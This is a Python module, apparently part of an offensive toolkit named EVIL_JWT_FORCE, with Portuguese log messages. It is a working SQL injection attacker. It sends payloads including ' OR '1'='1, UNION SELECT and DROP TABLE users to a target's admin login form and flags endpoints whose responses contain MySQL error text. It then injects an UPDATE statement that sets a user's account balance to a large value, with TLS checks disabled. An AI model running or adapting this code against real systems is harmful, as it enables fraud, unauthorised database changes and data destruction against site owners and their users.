# EVIL_JWT_FORCE/core/sql_injector.py

import httpx
import re
from urllib.parse import urljoin
from utils.helpers import save_to_output
from config.config_loader import load_config
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(filename='logs/bruteforce.log', level=logging.INFO, format='[%(asctime)s] %(message)s')

class SQLInjector:
    def __init__(self):
        self.config = load_config()
        self.session = httpx.Client(proxies=self.config.get("proxy", None), verify=False, timeout=15)
        self.payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL--",
            "'; UPDATE users SET balance=999999 WHERE userid=1--",
            "'; DROP TABLE users;--",
        ]
        self.vulnerable_endpoints = []

    def detect_vulnerable_fields(self, base_url: str):
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        test_path = self.config.get("panel_path", "/admin/login")
        full_url = urljoin(base_url, test_path)

        for payload in self.payloads:
            try:
                response = self.session.post(full_url, data={"username": payload, "password": "test"})
                if "mysql" in response.text.lower() or "syntax" in response.text.lower():
                    self.vulnerable_endpoints.append(full_url)
                    logger.info(f"[VULNERÁVEL] {full_url} com payload: {payload}")
                    break
            except Exception as e:
                logger.error(f"Erro ao testar injeção: {e}")

    def simulate_balance_injection(self, target_url: str, userid: int = 1, value: float = 99999.99):
        logger.info("💰 Tentando injetar saldo via SQLi...")
        injection = f"'; UPDATE users SET balance={value} WHERE userid={userid}; --"
        try:
            response = self.session.post(target_url, data={
                "username": injection,
                "password": "qualquer"
            })
            if response.status_code == 200:
                logger.info("✅ Injeção de saldo enviada com sucesso!")
                save_to_output("intercepted_tokens.txt", f"SQLi em: {target_url} com {injection}")
            else:
                logger.warning("⚠️ A resposta não foi 200. Verifique manualmente.")
        except Exception as e:
            logger.error(f"Erro ao executar injeção SQL: {e}")

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return

        self.detect_vulnerable_fields(base_url)
        for url in self.vulnerable_endpoints:
            self.simulate_balance_injection(url)

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()

